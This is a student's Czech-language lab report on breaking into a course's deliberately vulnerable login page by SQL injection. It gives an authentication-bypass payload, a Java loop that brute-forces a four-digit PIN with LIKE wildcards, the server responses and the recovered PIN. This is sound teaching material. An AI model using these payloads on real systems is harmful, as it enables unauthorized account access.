# REPORT - moravja8


## Prolomení login screen a zijštění username
**POST body:** "username= ' OR 1 = 1 AND username like '%moravja8%' OR '&password="
**Response:** <br />
    ```<pre><code><h2>Welcome <font color="green">rux6j_moravja8</font>, enter your four digit PIN number</h2><form id="pin" action="index.php" method="post"><input type="text" maxlength="4" name="pin" placeholder="_ _ _ _" required ><input type="submit" value="Verify"></form><a id="logout" href="index.php?logout">Logout</a></code></pre>```

## Zjištění pinu
**Postup:** pomocí wildcardů v sql injection lze pin bruteforcovat.  
**Kód:**

        for (int i = 0; i < 4; i++) {
            for (int j = 0; j < 10; j++) {
                String pin = String.valueOf(j);
                switch (i){
                    case 0: 
                        pin = pin + "___";
                        break;
                    case 1:
                        pin = "_" + pin + "__";
                        break;
                    case 2:
                        pin = "__" + pin + "_";
                        break;
                    case 3:
                        pin = "___" + pin;
                        break;
                    default:
                        throw new Exception("Bad state");    
                }
                main.sendPost(APP_URL, "username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '" + pin + "' OR '&password=");
            }
        }
**Response** <br />
Pozitivní odpovědi ve formátu "Welcome rux6j_moravja8, enter your four digit PIN number" přišly na následující requesty:

Sending 'POST' request to URL : https://kbe.felk.cvut.cz/ <br />
Post parameters : username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '5___' OR '&password=<br />
Post parameters : username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '_5\__' OR '&password=<br />
Post parameters : username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '__1\_' OR '&password=<br />
Post parameters : username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '___7' OR '&password=<br />

**Ověření pinu:**<br />
main.sendPost(APP_URL, "username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '5517' OR '&password=");<br />


